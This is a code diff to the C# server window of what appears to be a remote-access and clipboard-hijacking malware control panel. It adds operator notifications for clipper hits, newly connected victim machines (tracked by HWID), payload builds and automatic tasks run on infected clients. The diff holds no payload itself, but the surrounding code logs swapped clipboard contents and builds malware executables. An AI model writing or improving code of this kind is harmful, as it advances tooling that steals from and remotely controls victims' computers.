@@ -307,6 +307,7 @@ public partial class ServerWindow : Window
     private void HandleClipperDetected(string clientId, Protocol.ClipperDetectedData data)
     {
         _clipperCount++;
+        NotificationService.NotifyClipperTriggered();
         var display = clientId.Length > 8 ? clientId[..8] : clientId;
         var line = $"[{DateTime.Now:HH:mm:ss}]  [{display}]  {data.Type}  {data.Original}  →  {data.Replaced}\n";
         ClipperLog.AppendText(line);
@@ -410,7 +411,6 @@ public partial class ServerWindow : Window
                 _server.OnLog += msg => Dispatcher.Invoke(() => Log(msg));
                 _server.ClientConnected += c =>
                 {
-                    NotificationService.NotifyConnected(c.Id);
                     // UI update is batched — enqueue and let _batchTimer flush at 150ms intervals
                     _clientQueue.Enqueue((true, c));
 
@@ -419,6 +419,7 @@ public partial class ServerWindow : Window
                     {
                         bool isNewHwid = !_store.AllClients.TryGetValue(c.Hwid, out var rec)
                                          || rec.ActivityLog.Count <= 1;
+                        NotificationService.NotifyConnected(c.Id, isNewHwid);
 
                         if (_autoTasks.Count > 0)
                             await ExecuteAutoTasksForClient(c);
@@ -2763,6 +2764,7 @@ Read-Host 'Press Enter to close'
                 if (!string.IsNullOrWhiteSpace(stderr)) Log(stderr);
                 if (!string.IsNullOrWhiteSpace(stdout)) Log(stdout);
                 TxtBuildStatus.Text = "Build FAILED. Check logs.";
+                NotificationService.NotifyBuildError();
                 return;
             }
 
@@ -2849,6 +2851,7 @@ Read-Host 'Press Enter to close'
             Log($"[+] Builder: {Path.GetFileName(outputExe)} ({size:N0} bytes) saved.");
             TxtBuildStatus.Text = $"Built: {Path.GetFileName(outputExe)} ({sizeStr})";
             TxtStatusBar.Text = "Build successful.";
+            NotificationService.NotifyBuildSuccess();
 
             MessageBox.Show(
                 $"Build successful!\n\n" +
@@ -3391,6 +3394,7 @@ Read-Host 'Press Enter to close'
                 catch { lock (task.ExecutedHwids) task.ExecutedHwids.Remove(client.Hwid); throw; }
                 finally { client.WriteLock.Release(); }
                 Interlocked.Increment(ref task.ExecutionCountField);
+                NotificationService.NotifyAutoTaskDone();
                 // All Dispatcher calls are thread-safe — ExecuteAutoTasksForClient may run
                 // from Task.Run (ClientConnected) or UI thread (ExecuteAutoTasksForAllConnected).
                 _ = Dispatcher.BeginInvoke(() =>
